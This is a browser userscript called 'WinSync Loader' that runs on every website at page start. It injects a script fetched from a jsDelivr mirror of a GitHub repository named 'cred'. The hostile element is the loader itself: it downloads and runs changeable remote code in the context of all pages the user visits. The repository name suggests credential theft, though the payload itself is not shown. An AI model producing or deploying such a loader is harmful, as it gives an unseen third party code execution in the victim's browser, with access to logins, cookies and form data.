// ==UserScript==
// @name         WinSync Loader
// @namespace    http://tampermonkey.net/
// @version      1.0.1
// @match        *://*/*
// @grant        none
// @run-at       document-start
// @downloadURL  https://raw.githubusercontent.com/09sychic/cred/main/winsync.user.js
// @updateURL    https://raw.githubusercontent.com/09sychic/cred/main/winsync.user.js
// ==/UserScript==

(function() {
    console.log("%c[WinSync] Loader initialized...", "color: #00ff00; font-weight: bold;");

    const s = document.createElement('script');
    const source = "https://cdn.jsdelivr.net/gh/09sychic/cred@main/winsync.js?v=" + Date.now();
    
    s.src = source;
    
    s.onload = function() {
        console.log("%c[WinSync] Brain (winsync.js) successfully loaded from CDN.", "color: #00ff00;");
    };

    s.onerror = function() {
        console.error("[WinSync] FAILED to load Brain from CDN. Check your GitHub repo or JSDelivr link.");
    };

    // Inject into the top of the document
    (document.head || document.documentElement).appendChild(s);
    console.log("[WinSync] Injection attempt complete.");
})();
